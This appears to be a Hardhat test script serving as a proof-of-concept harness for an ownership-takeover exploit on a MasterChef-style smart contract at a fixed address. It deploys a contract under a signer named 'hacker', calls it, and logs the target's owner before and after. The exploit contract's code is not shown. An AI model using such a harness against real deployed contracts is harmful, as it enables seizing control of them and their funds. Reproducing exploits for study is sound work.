import { expect } from "chai";
import { defaultAccounts } from "ethereum-waffle";
import { getAddress } from "ethers/lib/utils";
import { ethers } from "hardhat";

describe("Greeter", function () {
  it("desc ...", async function () {
    const accounts = await ethers.getSigners()
    const hacker = await accounts[0];

    const Greeter = await ethers.getContractFactory("Greeter", hacker);
    const greeter = await Greeter.deploy();

    const cross = await ethers.getContractAt("IMasterChef", "0x70873211CB64c1D4EC027Ea63A399A7d07c4085B");

    await greeter.deployed();
    console.log('[Before] the owner of cross is: ', await cross.owner());
    await greeter.greet();
    console.log(`[After] the owner of cross is: ${await cross.owner()} (BTW: address of greeter is: ${greeter.address})`)
  });
});
